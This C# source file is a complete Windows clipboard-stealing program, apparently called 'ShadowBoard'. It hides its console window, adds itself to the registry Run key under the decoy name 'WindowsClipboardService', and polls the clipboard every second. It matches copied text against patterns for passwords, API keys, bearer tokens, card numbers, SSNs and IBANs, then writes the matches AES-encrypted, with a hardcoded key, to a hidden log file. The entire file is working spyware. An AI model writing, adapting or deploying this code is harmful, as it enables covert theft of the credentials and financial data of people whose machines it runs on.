using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Windows.Forms;

class Program
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    const int SW_HIDE = 0;

    static string previousContent = "";
    static string[] clipboardHistory = new string[20];
    static bool running = true;

    // AES key/IV (32-byte key, 16-byte IV)
    static byte[] key = Encoding.UTF8.GetBytes("12345678901234567890123456789012"); // 32 bytes
    static byte[] iv = Encoding.UTF8.GetBytes("1234567890123456"); // 16 bytes


    static void Main()
    {
        // 🛡️ Self-lock: 
        bool isAlreadyRunning = Process.GetProcessesByName(
            Path.GetFileNameWithoutExtension(System.Windows.Forms.Application.ExecutablePath)
        ).Length > 1;

        if (isAlreadyRunning)
        {
            File.AppendAllText(
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_log.txt"),
            $"[{DateTime.Now}] Exiting due to already running instance.\n"
             );
            return;
        }

    //    File.AppendAllText(
     //       Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_log.txt"),
     //       $"[{DateTime.Now}] Hello from ShadowBoard!\n"
     //   );

        HideConsole();
        AddToStartup();

        Thread clipboardThread = new Thread(WatchClipboard);
        clipboardThread.SetApartmentState(ApartmentState.STA);
        clipboardThread.IsBackground = false; // foreground thread
        clipboardThread.Start();

        Thread killSwitchThread = new Thread(WatchForKillSwitch);
        killSwitchThread.IsBackground = false; // foreground thread
        killSwitchThread.Start();

        
        clipboardThread.Join();
        killSwitchThread.Join();
    }

    static void HideConsole()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
    }

    static void AddToStartup()
    {
        string exePath = System.Windows.Forms.Application.ExecutablePath;
        string name = "WindowsClipboardService";
        RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (rk.GetValue(name) == null)
            rk.SetValue(name, exePath);
    }

    static void WatchClipboard()
    {
        string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_log.txt");
      //  File.AppendAllText(logPath, $"[{DateTime.Now}] Clipboard thread started.\n");

        while (running)
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    string text = Clipboard.GetText();

                 //   File.AppendAllText(logPath, $"[{DateTime.Now}] Clipboard content detected: {text}\n");

                    if (text != previousContent)
                    {
                        previousContent = text;
                        AddToHistory(text);

                        if (IsInteresting(text))
                        {
                            LogSensitiveData(text);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                string errorPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_error.txt");
                File.AppendAllText(errorPath, $"[{DateTime.Now}] Clipboard watch error: {ex.Message}\n");
            }

            Thread.Sleep(1000);
        }

      //  File.AppendAllText(logPath, $"[{DateTime.Now}] Clipboard thread stopped.\n");
    }

    static void AddToHistory(string content)
    {
        for (int i = clipboardHistory.Length - 1; i > 0; i--)
            clipboardHistory[i] = clipboardHistory[i - 1];
        clipboardHistory[0] = content;
    }

    static bool IsInteresting(string text)
    {
        var patterns = new[]
        {
            @"(?i)password\s*[:=]\s*.+",                         // password= or password:
            @"AKIA[0-9A-Z]{16}",                                // AWS Access Key ID
            @"(?i)bearer\s+[a-zA-Z0-9\-_\.]+",                  // Bearer tokens
            @"https?:\/\/[^\s]+",                               // URLs
            @"(?i)(user(name)?|login)\s*[:=]\s*.+",             // username= or login=
            @"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",  // Email addresses
            @"AIza[0-9A-Za-z\\-_]{35}",                         // Google API keys
            @"sk_live_[0-9a-zA-Z]{24}",                         // Stripe secret keys
            @"\b(?:\d[ -]*?){13,16}\b",                         // Credit card numbers (loosely)
            @"\b\d{3}-\d{2}-\d{4}\b",                           // US Social Security Number format
            @"eyJ[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+", // JWT tokens
            @"\b(?:\d{1,3}\.){3}\d{1,3}\b",                     // IPv4 addresses
            @"(?i)secret\s*[:=]\s*.+",                          // secret= or secret:
            @"(?i)token\s*[:=]\s*.+",                           // token= or token:
            @"(?i)apikey\s*[:=]\s*.+",                          // apikey= or apikey:
            @"[A-Z]{2}\d{2}[ ]?([0-9]{4}[ ]?){4,7}[0-9]{1,4}", // IBAN 
        };

        return patterns.Any(pattern => Regex.IsMatch(text, pattern));
    }

    static void LogSensitiveData(string data)
    {
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_log.txt");

        // Debug log πριν το encryption
       // File.AppendAllText(path, $"[DEBUG] Unencrypted log: {data}\n");

        string encrypted = EncryptWithAES($"[{DateTime.Now}] {data}", key, iv);
        if (!string.IsNullOrEmpty(encrypted))
        {
            File.AppendAllText(path, encrypted + Environment.NewLine);
        }
        else
        {
            File.AppendAllText(
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_error.txt"),
                $"[ERROR] {DateTime.Now}: Encryption returned empty string for data: {data}\n"
            );
        }
    }

    static string EncryptWithAES(string plainText, byte[] key, byte[] iv)
    {
        try
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (var encryptor = aes.CreateEncryptor())
                using (var ms = new MemoryStream())
                using (var cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                using (var sw = new StreamWriter(cs))
                {
                    sw.Write(plainText);
                    sw.Close();
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }
        catch (Exception ex)
        {
            File.AppendAllText(
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_error.txt"),
                $"[ERROR] {DateTime.Now}: {ex}\n"
            );
            return "";
        }
    }

    static void WatchForKillSwitch()
    {
        string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_log.txt");
       // File.AppendAllText(logPath, $"[{DateTime.Now}] KillSwitch thread started.\n");

        while (running)
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName("cmd"))
                {
                    if (!string.IsNullOrEmpty(proc.MainWindowTitle) && proc.MainWindowTitle.Contains("!exit"))
                    {
                       // File.AppendAllText(logPath, $"[{DateTime.Now}] KillSwitch detected. Exiting.\n");
                        running = false;
                        Environment.Exit(0);
                    }
                }
            }
            catch (Exception ex)
            {
                string errorPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "clipboard_error.txt");
              //  File.AppendAllText(errorPath, $"[{DateTime.Now}] KillSwitch watch error: {ex.Message}\n");
            }

            Thread.Sleep(3000);
        }

       // File.AppendAllText(logPath, $"[{DateTime.Now}] KillSwitch thread stopped.\n");
    }
}
